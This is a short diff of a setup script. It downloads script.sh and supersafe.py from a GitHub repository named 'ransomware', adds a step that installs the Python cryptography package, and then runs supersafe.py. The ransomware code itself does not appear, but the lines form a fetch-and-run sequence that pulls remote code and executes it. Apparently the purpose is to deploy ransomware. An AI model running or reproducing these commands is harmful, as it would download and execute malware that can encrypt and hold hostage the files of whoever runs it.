@@ -4,6 +4,9 @@
 curl -O https://raw.githubusercontent.com/harshilbadminton/ransomware/master/script.sh
 curl -O https://raw.githubusercontent.com/harshilbadminton/ransomware/master/supersafe.py
 
+
+# Install cryptography
+pip install cryptography
 # Run supersafe.py
 python supersafe.py
 
